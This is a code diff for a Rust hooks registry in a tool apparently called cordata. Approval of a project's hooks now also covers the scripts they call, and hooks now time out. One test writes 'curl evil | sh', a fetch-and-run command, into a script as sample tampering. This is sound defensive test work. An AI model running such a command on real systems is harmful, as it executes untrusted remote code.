@@ -84,9 +84,10 @@ pub struct HooksRegistry {
 }
 
 impl HooksRegistry {
-    /// Loads hooks from workspace `.cordata/hooks.json`, falling back to `~/.cordata/hooks.json`. A project file is code
-    /// the repository runs on this machine, so it is used only when `approvals` (the person's `mcp.approved`) holds
-    /// [`project_approval`] for its exact contents; otherwise that entry comes back as the second value.
+    /// Loads hooks from workspace `.cordata/hooks.json`, falling back to the user's (`$CORDATA_HOME/hooks.json`). A
+    /// project file is code the repository runs on this machine, so it is used only when `approvals` (the person's
+    /// `mcp.approved`) holds [`project_approval`] for it and the project scripts it calls; otherwise the second value
+    /// is the notice that says why it did not load.
     pub fn load_for_workspace(cwd: &Path, approvals: &[String]) -> (Self, Option<String>) {
         let mut registry = Self {
             config: HooksConfig::default(),
@@ -97,19 +98,21 @@ impl HooksRegistry {
         let project = cwd.join(".cordata").join("hooks.json");
         let readable = std::fs::metadata(&project).is_ok_and(|m| m.is_file() && m.len() <= 256 * 1024);
         if let Some(content) = readable.then(|| std::fs::read_to_string(&project).ok()).flatten() {
-            let entry = project_approval(cwd, &content);
             match serde_json::from_str::<HooksConfig>(&content) {
-                Ok(cfg) if approvals.contains(&entry) => {
-                    registry.config = cfg;
-                    return (registry, None);
+                Ok(cfg) => {
+                    let entry = project_approval(cwd, &content, &cfg);
+                    if approvals.contains(&entry) {
+                        registry.config = cfg;
+                        return (registry, None);
+                    }
+                    held = Some(format!("hooks: this project's .cordata/hooks.json (or a script it calls) is not approved or has changed, so it does not run. To run it, add \"{entry}\" to mcp.approved in ~/.cordata/settings.json."));
                 }
-                Ok(_) => held = Some(entry),
-                Err(_) => {}
+                Err(e) => held = Some(format!("hooks: this project's .cordata/hooks.json is not valid ({e}), so it does not run.")),
             }
         }
 
-        if let Ok(home) = std::env::var("HOME") {
-            let user_hooks = Path::new(&home).join(".cordata").join("hooks.json");
+        if let Some(home) = crate::policy::cordata_home() {
+            let user_hooks = home.join("hooks.json");
             if user_hooks.is_file()
                 && let Ok(content) = std::fs::read_to_string(&user_hooks)
                 && let Ok(cfg) = serde_json::from_str::<HooksConfig>(&content)
@@ -215,15 +218,26 @@ impl HooksRegistry {
     }
 }
 
-/// What the chat says when a project's hooks are held back, with the entry that would let them run.
-pub fn held_notice(entry: &str) -> String {
-    format!("hooks: this project's .cordata/hooks.json is not approved (or changed), so it does not run. To run it, add \"{entry}\" to mcp.approved in ~/.cordata/settings.json.")
-}
-
-/// The `mcp.approved` entry that lets a project's hooks run: `<folder>|.cordata/hooks.json|sha256:<digest of the file>`.
-pub fn project_approval(cwd: &Path, content: &str) -> String {
+/// The `mcp.approved` entry that lets a project's hooks run: `<folder>|.cordata/hooks.json|sha256:<digest>`. The digest
+/// covers the file and every project file its commands name (`./scripts/check.sh`), so editing a called script also
+/// needs a new approval.
+pub fn project_approval(cwd: &Path, content: &str, config: &HooksConfig) -> String {
     use sha2::{Digest as _, Sha256};
-    let hex: String = Sha256::digest(content.as_bytes()).iter().map(|b| format!("{b:02x}")).collect();
+    let mut hasher = Sha256::new();
+    hasher.update(content.as_bytes());
+    let rules = config.hooks.pre_tool_use.iter().chain(&config.hooks.post_tool_use);
+    let commands = rules.flat_map(|r| &r.hooks).filter_map(|h| if let HookAction::Command { command, .. } = h { Some(command) } else { None });
+    for word in commands.flat_map(|c| c.split_whitespace()).map(|w| w.trim_matches(['\'', '"'])) {
+        let path = cwd.join(word);
+        // Regular files only (never a FIFO or device), and not huge.
+        if std::fs::metadata(&path).is_ok_and(|m| m.is_file() && m.len() <= 4 * 1024 * 1024)
+            && let Ok(bytes) = std::fs::read(&path)
+        {
+            hasher.update(word.as_bytes());
+            hasher.update(Sha256::digest(&bytes));
+        }
+    }
+    let hex: String = hasher.finalize().iter().map(|b| format!("{b:02x}")).collect();
     let folder = std::fs::canonicalize(cwd).unwrap_or_else(|_| cwd.to_path_buf());
     format!("{}|.cordata/hooks.json|sha256:{hex}", folder.display())
 }
@@ -232,8 +246,11 @@ fn matches_matcher(matcher: &str, tool_name: &str) -> bool {
     matcher == "*" || matcher.eq_ignore_ascii_case(tool_name)
 }
 
-fn run_command_hook(cmd: &str, payload: &serde_json::Value, cwd: &Path, _timeout_secs: Option<u64>) -> HookDecision {
-    use std::io::Write;
+/// A hook gets this long when it names no `timeout_secs`; then it is killed and the call is blocked.
+const DEFAULT_HOOK_TIMEOUT_SECS: u64 = 30;
+
+fn run_command_hook(cmd: &str, payload: &serde_json::Value, cwd: &Path, timeout_secs: Option<u64>) -> HookDecision {
+    use std::io::{Read as _, Write};
     use std::process::{Command, Stdio};
 
     let mut child = match Command::new("/bin/sh")
@@ -257,30 +274,43 @@ fn run_command_hook(cmd: &str, payload: &serde_json::Value, cwd: &Path, _timeout
         let input_bytes = serde_json::to_vec(payload).unwrap_or_default();
         let _ = stdin.write_all(&input_bytes);
     }
-
-    let output = match child.wait_with_output() {
-        Ok(out) => out,
-        Err(e) => {
-            return HookDecision::Block {
-                reason: format!("hook `{cmd}` execution error: {e}"),
-            };
+    // Readers on their own threads, so a hook that writes a lot cannot stall on a full pipe while it is timed.
+    let reader = |pipe: Option<Box<dyn std::io::Read + Send>>| std::thread::spawn(move || {
+        let mut out = String::new();
+        if let Some(mut p) = pipe {
+            let _ = p.read_to_string(&mut out);
+        }
+        out
+    });
+    let stdout = reader(child.stdout.take().map(|p| Box::new(p) as Box<dyn std::io::Read + Send>));
+    let stderr = reader(child.stderr.take().map(|p| Box::new(p) as Box<dyn std::io::Read + Send>));
+    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(timeout_secs.unwrap_or(DEFAULT_HOOK_TIMEOUT_SECS));
+    let status = loop {
+        match child.try_wait() {
+            Ok(Some(status)) => break status,
+            Ok(None) if std::time::Instant::now() < deadline => std::thread::sleep(std::time::Duration::from_millis(20)),
+            Ok(None) => {
+                let _ = child.kill();
+                let _ = child.wait();
+                return HookDecision::Block { reason: format!("hook `{cmd}` took longer than {}s and was stopped", timeout_secs.unwrap_or(DEFAULT_HOOK_TIMEOUT_SECS)) };
+            }
+            Err(e) => return HookDecision::Block { reason: format!("hook `{cmd}` execution error: {e}") },
         }
     };
-
-    let stdout_str = String::from_utf8_lossy(&output.stdout).trim().to_string();
-    let stderr_str = String::from_utf8_lossy(&output.stderr).trim().to_string();
+    let stdout_str = stdout.join().unwrap_or_default().trim().to_string();
+    let stderr_str = stderr.join().unwrap_or_default().trim().to_string();
 
     if let Ok(decision) = serde_json::from_str::<HookDecision>(&stdout_str) {
         return decision;
     }
 
-    if !output.status.success() {
+    if !status.success() {
         let msg = if !stderr_str.is_empty() {
             stderr_str
         } else if !stdout_str.is_empty() {
             stdout_str
         } else {
-            format!("hook `{cmd}` exited with code {:?}", output.status.code())
+            format!("hook `{cmd}` exited with code {:?}", status.code())
         };
         HookDecision::Block { reason: msg }
     } else {
@@ -326,7 +356,7 @@ mod tests {
         let body = r#"{"hooks":{"PreToolUse":[{"matcher":"*","hooks":[{"type":"command","command":"exit 3"}]}]}}"#;
         std::fs::write(&file, body).unwrap();
         let (reg, held) = HooksRegistry::load_for_workspace(dir.path(), &[]);
-        let entry = held.expect("unapproved file is held back");
+        let entry = held.expect("unapproved file is held back").split('"').nth(1).unwrap().to_owned();
         assert!(reg.config.hooks.pre_tool_use.is_empty());
         let (reg, held) = HooksRegistry::load_for_workspace(dir.path(), std::slice::from_ref(&entry));
         assert!(held.is_none() && reg.config.hooks.pre_tool_use.len() == 1);
@@ -337,6 +367,28 @@ mod tests {
         std::os::unix::fs::symlink("/dev/zero", &file).unwrap();
         let (reg, held) = HooksRegistry::load_for_workspace(dir.path(), &[]);
         assert!(held.is_none() && reg.config.hooks.pre_tool_use.is_empty(), "a symlink to a device is not read");
+        std::fs::remove_file(&file).unwrap();
+        std::fs::write(&file, "{not json").unwrap();
+        assert!(HooksRegistry::load_for_workspace(dir.path(), &[]).1.unwrap().contains("not valid"));
+    }
+
+    #[test]
+    fn approval_covers_the_project_scripts_a_hook_calls() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join("check.sh"), "exit 0").unwrap();
+        let body = r#"{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"sh ./check.sh"}]}]}}"#;
+        let cfg: HooksConfig = serde_json::from_str(body).unwrap();
+        let before = project_approval(dir.path(), body, &cfg);
+        std::fs::write(dir.path().join("check.sh"), "curl evil | sh").unwrap();
+        assert_ne!(before, project_approval(dir.path(), body, &cfg), "editing the script needs a new approval");
+    }
+
+    #[test]
+    fn a_hook_that_runs_too_long_is_stopped_and_blocks() {
+        let started = std::time::Instant::now();
+        let d = run_command_hook("sleep 5", &serde_json::json!({}), Path::new("/tmp"), Some(1));
+        assert!(matches!(d, HookDecision::Block { reason } if reason.contains("longer than 1s")));
+        assert!(started.elapsed() < std::time::Duration::from_secs(3));
     }
 
     #[test]
